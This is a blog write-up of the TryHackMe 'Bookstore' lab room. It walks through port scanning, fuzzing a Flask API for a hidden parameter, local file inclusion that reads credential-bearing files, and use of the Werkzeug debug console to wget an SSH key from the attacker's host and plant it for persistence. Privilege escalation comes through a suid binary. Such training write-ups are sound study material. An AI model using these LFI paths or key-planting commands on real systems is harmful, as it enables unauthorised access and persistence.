---
layout: post
title:  "TryHackMe Bookstore writeup"
date:   2020-12-02 12:59:36 +0200
categories: writeup tryhackme
---
# Bookstore

This is a writeup for TryHackMe room [Bookstore](https://tryhackme.com/room/bookstoreoc). 

## Reconnaissance

Let’s start with a nmap scan:
```bash
nmap -sC -sV -p- 10.10.238.197
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-29 10:40 EET
Nmap scan report for 10.10.238.197
Host is up (0.056s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok, this is a Linux box running a web server and some Python based backend. Let’s take a closer look. The actual web site is pretty simple, I enumerate it and find some interesting notes regarding the backend:

```javascript
function getAPIURL() {
    var str = window.location.hostname;
    str = str + ":5000"
    return str;
}

async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}
...
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

on login page after unsuccessful login:
```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
``` 

Nothing more so let’s focus on the backend. There is a documentation page which describes the API routes available.
Image for post
Looking at the comment about previous version vulnerability I test
```
GET /api/_v1_/resources/books?published=2014 HTTP/1.1 
````

It works so the previous API is still there. If there is a LFI at some parameter, let’s try to find it with wfuzz:
```bash
wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://10.10.199.238:5000/api/v1/resources/books?FUZZ=1993

********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.199.238:5000/api/v1/resources/books?FUZZ=1993
Total requests: 949
===================================================================
ID           Response   Lines    Word     Chars       Payload                                              
===================================================================
000000751:   500        356 L    1747 W   23076 Ch    "_show_"
Total time: 10.57543
Processed Requests: 949
Filtered Requests: 948
Requests/sec.: 89.73629
```

Ok, there is a new parameter which isn’t documented. Let’s see what the response looks like:
![Response]({{ site.url }}/assets/bookstore/bookstoreresponse.png)

Ok, simply by specifying a filename in the show-parameter we can view it on the server.

## Gaining entry

Start by grabbing the user flag from `http://10.10.199.238:5000/api/v1/resources/books?show=/home/sid/user.txt`

And the WERKZEUG_DEBUG_PIN file might come handy later: 

````
http://10.10.199.238:5000/api/v1/resources/books?show=/home/sid/.bash_history

cd /home/sid whoami export WERKZEUG_DEBUG_PIN=__REDACTED__ echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit
````

We can also take a look at the api source code: `view-source:http://10.10.199.238:5000/api/v1/resources/books?show=/home/sid/api.py``

With the debug pin we can execute any python code we want using the console:

![Response]({{ site.url }}/assets/bookstore/pythondebug.png)

This time I want SSH access to be able to wreck havoc fast. I accomplish this by uploading my SSH public key to the server and adding it to Sid’s account:
```python
os.system("mkdir /home/sid/.ssh")
os.system("wget http://10.8.108.247/authorized_keys")
os.system("cp authorized_keys /home/sid/.ssh")
````
and then ssh in as sid. There seems to be a cronjob deleting .ssh folder every two minutes but it seems it didn’t work.

## Privilege escalation

Immediately looking at Sid’s home directory it is clear what the PE vector is. There is a a binary with suid bit set:
![Response]({{ site.url }}/assets/bookstore/tryharder.png)

I download a copy and analyze with Cutter:
![Response]({{ site.url }}/assets/bookstore/Cutter.png)

Mmm.. bit arithmetic. To make it easy I just write a C program that does the arithmetic.

{% gist 1fe219ace66d29489a9c767429354118 %}

With the answer I can enter the magic number into the suid program and BOOM! I’m root.
